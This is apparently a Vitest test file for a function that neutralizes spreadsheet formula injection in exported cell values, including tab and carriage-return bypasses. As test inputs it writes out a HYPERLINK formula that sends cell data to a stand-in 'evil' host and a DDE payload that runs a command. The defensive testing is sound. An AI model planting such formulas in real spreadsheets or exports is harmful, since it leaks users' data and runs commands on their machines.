import { describe, it, expect } from "vitest";
import { neutralizeSpreadsheetValue } from "./spreadsheet-safety";

describe("neutralizeSpreadsheetValue", () => {
  it("prefixes the classic formula lead-ins = + @", () => {
    expect(neutralizeSpreadsheetValue("=1+1")).toBe("'=1+1");
    expect(neutralizeSpreadsheetValue("+1")).toBe("'+1");
    expect(neutralizeSpreadsheetValue("@SUM(A1)")).toBe("'@SUM(A1)");
  });

  it("neutralizes the real exfil/DDE payloads", () => {
    const hyperlink = '=HYPERLINK("https://evil/?d="&A2,"x")';
    expect(neutralizeSpreadsheetValue(hyperlink)).toBe(`'${hyperlink}`);
    expect(neutralizeSpreadsheetValue("=cmd|'/c calc'!A1")).toBe(
      "'=cmd|'/c calc'!A1",
    );
  });

  it("neutralizes TAB and CR lead-ins (the gap the CSV-only guard missed)", () => {
    expect(neutralizeSpreadsheetValue("\t=1+1")).toBe("'\t=1+1");
    expect(neutralizeSpreadsheetValue("\r=1+1")).toBe("'\r=1+1");
  });

  it("exempts plain negative numbers (legitimate credits/balances)", () => {
    expect(neutralizeSpreadsheetValue("-50.00")).toBe("-50.00");
    expect(neutralizeSpreadsheetValue("-1234")).toBe("-1234");
  });

  it("still neutralizes a leading - that is NOT a plain number", () => {
    expect(neutralizeSpreadsheetValue("-1+2")).toBe("'-1+2");
    expect(neutralizeSpreadsheetValue("-=cmd")).toBe("'-=cmd");
  });

  it("leaves ordinary text and empty cells untouched", () => {
    expect(neutralizeSpreadsheetValue("Jane Doe")).toBe("Jane Doe");
    expect(neutralizeSpreadsheetValue("Unit 4B")).toBe("Unit 4B");
    expect(neutralizeSpreadsheetValue("123 Main St")).toBe("123 Main St");
    expect(neutralizeSpreadsheetValue("")).toBe("");
    expect(neutralizeSpreadsheetValue("1000.00")).toBe("1000.00");
  });
});
